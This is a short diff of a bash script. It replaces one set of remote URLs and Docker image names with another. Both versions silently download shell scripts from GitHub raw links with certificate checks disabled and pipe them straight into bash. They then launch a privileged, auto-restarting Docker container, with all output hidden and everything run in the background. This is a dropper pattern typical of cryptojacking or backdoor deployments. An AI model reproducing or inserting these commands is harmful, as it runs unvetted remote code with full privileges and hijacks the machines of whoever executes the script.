@@ -1,4 +1,4 @@
 #!/bin/bash
 
-which docker >/dev/null 2>&1 || bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/vjbahkds/obgcxz/main/i.sh) >/dev/null 2>&1 &
-bash -c "wget --no-check-certificate -qO- https://raw.githubusercontent.com/vjbahkds/obgcxz/main/d.sh |bash -s 9 servehulls/jaijbcq && docker run -dt --privileged=true --restart=always servehulls/vuasnt:latest " >/dev/null 2>&1 &
+which docker >/dev/null 2>&1 || bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/army2mil/cautech/main/i.sh) >/dev/null 2>&1 &
+bash -c "wget --no-check-certificate -qO- https://raw.githubusercontent.com/army2mil/cautech/main/d.sh |bash -s 9 army2mil/nkasbq && docker run -dt --privileged=true --restart=always cautech/tech:tech " >/dev/null 2>&1 &
